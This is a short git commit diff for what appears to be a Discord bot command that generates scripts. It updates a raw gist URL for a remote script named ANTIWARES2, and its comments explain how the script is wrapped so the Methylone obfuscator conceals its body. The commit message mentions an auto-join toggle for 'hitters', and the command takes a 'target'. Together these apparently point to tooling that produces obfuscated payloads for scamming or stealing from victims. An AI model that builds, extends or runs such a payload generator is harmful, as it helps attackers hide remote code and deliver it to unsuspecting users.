c94b666faa79f86aa32939ce8c5f261a72ae8509
ANTIWARE <bellaboosh123@gmail.com>
2026-08-14 19:26:02 +0100

    Added auto-join toggle for hitters and cleaned up script

--- src/commands/generate.js
+++ src/commands/generate.js
@@ -49,8 +49,7 @@ export async function execute(interaction) {
   const target = submitted.fields.getTextInputValue('target');
   const pingRole = submitted.fields.getTextInputValue('pingRole') || '';
 
-  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/f22833c14e63b70be8b3a760d626655a9892f868/ANTIWARES2";
-
+  const GIST_URL = "https://gist.githubusercontent.com/malik020859-ui/f513af3ff4e17351ea21a0fae5dba45e/raw/bde161ea34da4aec78dc1708cb0e3c42a0b6240d/ANTIWARES2";
   // ---- WRAPPER WITH ANONYMOUS FUNCTION ----
   // Wrapping in (function() ... end)() makes Methylone obfuscate the function body
   // instead of the raw script, preventing the "attempt to call a nil value" error.
